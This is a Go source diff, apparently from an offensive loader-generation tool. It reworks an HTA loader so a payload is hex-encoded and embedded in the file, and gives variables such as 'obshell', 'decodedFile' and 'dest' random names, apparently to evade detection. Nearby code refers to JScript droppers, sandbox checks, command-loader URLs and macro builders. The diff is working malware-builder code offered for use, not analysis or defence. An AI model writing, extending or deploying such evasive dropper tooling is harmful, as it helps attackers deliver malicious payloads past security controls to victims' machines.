@@ -7,6 +7,7 @@ import (
 	"bufio"
 	"bytes"
 	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -859,11 +860,32 @@ func JScript_Buff(fso string, dropPath string, encoded string, code string, name
 	return buffer.String()
 }
 
-func HTA_Buff(finalcode string) string {
+func HTA_Buff(hexcode string, filename string) string {
 	var buffer bytes.Buffer
 	HTALoader := &HTALoader{}
 	HTALoader.Variables = make(map[string]string)
-	HTALoader.Variables["payload"] = finalcode
+	HTALoader.Variables["payload"] = hexcode
+	HTALoader.Variables["filename"] = filename
+	HTALoader.Variables["RNZyt"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["bogusWindows1252Chars"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["correctLatin1Chars"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["fos"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["obshell"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["pathworks"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["dest"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["fromByte"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["decode"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["chunkSize"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["source"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["decodedFile"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["decode"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["hexString"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["fromByte"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["decodedFile"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["sleep"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["obshell"] = Cryptor.VarNumberLength(4, 9)
+	HTALoader.Variables["test1"] = Cryptor.VarNumberLength(4, 9)
+
 	buffer.Reset()
 	HTATemplate, err := template.New("HTALoader").Parse(Struct.HTA())
 	if err != nil {
@@ -977,7 +999,10 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 	finalcode := JScript_Buff(fso, dropPath, encoded, code, name, mode, sandbox)
 	URL = Utils.Command(URL, CommandLoader, outFile)
 	if CommandLoader == "hta" {
-		finalcode = HTA_Buff(finalcode)
+		//finalcode = HTA_Buff(finalcode)
+		hexcode := hex.EncodeToString(content)
+		finalcode = HTA_Buff(hexcode, filename)
+
 	}
 	if CommandLoader == "macro" {
 		Macro_Buff(URL, outFile)
